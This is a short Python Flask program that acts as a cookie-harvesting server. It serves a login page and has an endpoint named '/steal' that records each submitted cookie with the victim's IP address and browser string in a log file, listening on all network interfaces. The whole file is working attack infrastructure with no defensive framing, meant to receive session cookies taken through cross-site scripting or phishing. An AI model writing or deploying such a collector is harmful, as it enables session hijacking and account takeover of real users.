from flask import Flask, request, render_template
import os
from datetime import datetime

app = Flask(__name__)

LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/steal', methods=['POST'])
def steal():
    cookie = request.form.get('cookie')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    with open(os.path.join(LOG_DIR, 'cookies.txt'), 'a') as f:
        f.write(f"[{datetime.now()}] IP: {ip} | UA: {user_agent}\n")
        f.write(f"🍪 Cookie: {cookie}\n\n")

    return "", 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
